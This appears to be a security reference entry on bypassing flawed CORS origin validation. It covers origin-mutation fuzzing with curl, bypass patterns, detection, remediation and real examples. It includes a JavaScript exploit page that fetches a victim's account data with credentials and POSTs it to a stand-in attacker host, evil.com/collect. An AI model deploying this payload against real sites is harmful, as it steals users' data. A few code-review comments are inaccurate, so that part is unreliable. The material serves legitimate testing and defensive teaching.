# CORS: Regex Bypass and Origin Expansion

**Category:** CORS Misconfiguration
**Severity:** High
**CVSS Range:** 6.5 - 8.8

## Attack Description

When applications attempt to validate the `Origin` header using regex or string operations, flawed implementations can be bypassed. Common mistakes include:
- Checking if origin **ends with** the trusted domain (suffix match)
- Checking if origin **starts with** the trusted domain (prefix match)
- Using regex with unescaped dots
- Not anchoring regex properly

These flaws let an attacker register a domain that passes the validation check, enabling full CORS exploitation.

## Prerequisites

1. Target uses dynamic origin validation (not a static whitelist)
2. Validation logic has a bypass (regex flaw, suffix/prefix matching)
3. `Access-Control-Allow-Credentials: true` is set
4. Attacker can register a domain that passes the check

## Exploitation Steps

### 1. Identify Validation Logic

```bash
# Test a series of origin mutations
ORIGINS=(
  "https://evil.com"
  "https://target.com.evil.com"        # Subdomain of attacker
  "https://eviltarget.com"             # Prefix match bypass
  "https://target.com.evil.com"        # Suffix match bypass  
  "https://target.computer"            # TLD extension
  "https://targetxcom"                 # Dot replacement
  "https://target.com@evil.com"        # @ symbol in origin
  "https://target.com%60.evil.com"     # Backtick (Safari)
  "https://target_com.evil.com"        # Underscore (Firefox/Chrome)
  "null"                               # Null origin
  "http://target.com"                  # Protocol downgrade
  "https://localhost"                  # Localhost trust
)

for origin in "${ORIGINS[@]}"; do
  echo "Testing: $origin"
  curl -s -D- -H "Origin: $origin" https://target.com/api/user 2>/dev/null | grep -i "access-control-allow-origin"
  echo "---"
done
```

### 2. Common Bypass Patterns

#### Suffix Match Bypass
If target trusts origins ending in `target.com`:
```
https://definitelynotattarget.com  -> Fails (different word)
https://evil-target.com            -> May pass
https://evil.target.com            -> Passes (subdomain)
https://target.com.evil.com        -> May pass (depends on implementation)
```

#### Prefix Match Bypass
If target trusts origins starting with `https://target.com`:
```
https://target.com.evil.com        -> Passes
https://target.com:evil.com        -> May pass (port confusion)
```

#### Unescaped Dot in Regex
If regex is `^https://api.target.com$` (dot not escaped):
```
https://apiatarget.com             -> Passes (dot matches any char)
https://api-target.com             -> Passes
```

#### Browser-Specific Characters
```
# Safari only (backtick):
https://target.com`.evil.com

# Firefox/Chrome (underscore):
https://target.com_.evil.com
```

### 3. Exploit

Once you find a bypassing origin, register that domain and host the standard CORS exploitation page:

```html
<!-- Hosted on target.com.evil.com (or whichever domain bypassed validation) -->
<script>
fetch('https://target.com/api/account', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

## Detection Method

### Fuzzing Approach
Use the origin list above as a fuzzing dictionary. For each target API endpoint, test all mutations and log which ones get reflected in ACAO.

### Burp Suite Intruder
1. Capture a request with `Origin` header
2. Send to Intruder
3. Set payload position on the Origin value
4. Load origin mutation list
5. Grep match on `Access-Control-Allow-Origin` in responses

### Code Review Patterns

```python
# BAD: endswith check
if origin.endswith('.target.com') or origin == 'https://target.com':
    # Bypassed by evil-target.com

# BAD: startswith check  
if origin.startswith('https://target.com'):
    # Bypassed by target.com.evil.com

# BAD: unescaped regex
if re.match(r'https://.*target.com', origin):
    # Bypassed by evil.com?target.com or evilXtarget.com

# BAD: substring check
if 'target.com' in origin:
    # Bypassed by target.com.evil.com, evilAtarget.com, etc.

# GOOD: exact match against whitelist
ALLOWED = {'https://app.target.com', 'https://api.target.com'}
if origin in ALLOWED:
    # Only exact matches pass
```

## Remediation

1. **Use exact-match whitelists**: Never use regex, startsWith, endsWith, or contains
2. **If regex is necessary**: Escape all special characters, anchor both ends (`^...$`), and test extensively
3. **Parse origins as URLs**: Compare scheme, host, and port separately instead of string matching
4. **Reject anything not in the whitelist**: Default to denying CORS, only allow explicit entries
5. **Audit third-party middleware**: Some CORS libraries have their own parsing bugs

## Real Examples

1. **advisor.com (PortSwigger)**: Trusted all origins ending in `advisor.com`. Bypassed with `definitelynotadvisor.com`.

2. **btc.net (PortSwigger)**: Bitcoin exchange trusted all origins starting with `https://btc.net`. Bypassed with `https://btc.net.evil.net`.

3. **HackerOne #470298**: CORS misconfiguration due to improper origin validation, enabling cross-origin data access.

4. **Multiple Bug Bounty Programs**: Intigriti reports numerous bounties for regex bypass in origin validation, including unescaped dots and suffix matching.

## Web3 Context

- **Multi-subdomain DeFi apps**: `app.defi.com`, `api.defi.com`, `bridge.defi.com` often use suffix matching to trust all subdomains. An XSS on any subdomain (or a subdomain takeover) chains into full CORS exploitation.
- **Protocol-owned subdomains on third-party hosting**: Many DeFi protocols have `docs.protocol.com` on GitBook, `status.protocol.com` on various SaaS. If these are trusted via wildcard subdomain CORS, XSS on the third-party platform = CORS exploitation.
- **ENS-linked domains**: Some DeFi apps accept origins from ENS-resolved domains with minimal validation.
